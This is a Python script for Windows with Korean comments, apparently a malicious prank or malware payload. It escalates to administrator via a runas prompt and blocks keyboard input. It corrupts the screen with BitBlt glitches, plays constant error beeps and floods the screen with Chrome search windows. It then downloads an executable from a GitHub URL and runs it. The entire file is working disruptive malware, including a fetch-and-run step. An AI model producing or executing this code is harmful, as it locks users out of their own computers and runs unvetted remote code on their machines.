import os
import ctypes
import threading
import time
import sys
import subprocess
import random
import keyboard
import pyautogui
import win32gui
import win32con
import win32api
import requests

# 설정
pyautogui.FAILSAFE = False
CHROME_PATH = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
TEMP_DIR = os.environ.get('TEMP')
CHILLED_PATH = os.path.join(TEMP_DIR, "chilledwindows.exe")
DOWNLOAD_URL = "https://github.com/Matelpro777/ChilledWindows.exe/raw/master/ChilledWindows.exe"

def download_file():
    try:
        response = requests.get(DOWNLOAD_URL)
        with open(CHILLED_PATH, 'wb') as f:
            f.write(response.content)
    except: pass

def block_input():
    for i in range(150):
        try: keyboard.block_key(i)
        except: pass

def glich_screen():
    hdc = win32gui.GetDC(0)
    width = win32api.GetSystemMetrics(0)
    height = win32api.GetSystemMetrics(1)
    while True:
        x, y = random.randint(0, width), random.randint(0, height)
        win32gui.BitBlt(hdc, x + random.randint(-10,10), y + random.randint(-10,10), 100, 100, hdc, x, y, win32con.SRCCOPY)
        time.sleep(0.001)

def play_noise():
    while True:
        win32api.MessageBeep(win32con.MB_ICONERROR)
        time.sleep(0.1)

def search_bomb():
    subprocess.Popen([CHROME_PATH, "--new-window", f"https://www.google.com/search?q={random.randint(1000,9999)}"])

def run_shadow():
    # 1. 화면 붕괴 & 기계음 (30초)
    threading.Thread(target=glich_screen, daemon=True).start()
    threading.Thread(target=play_noise, daemon=True).start()
    time.sleep(30)
    
    # 2. 검색창 폭탄 (30초)
    for _ in range(30):
        search_bomb()
        time.sleep(1)
        
    # 3. 외부 파일 다운로드 및 실행
    download_file()
    if os.path.exists(CHILLED_PATH):
        subprocess.Popen([CHILLED_PATH])
    
    time.sleep(5)
    

if __name__ == "__main__":
    if ctypes.windll.shell32.IsUserAnAdmin():
        threading.Thread(target=block_input, daemon=True).start()
        run_shadow()
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
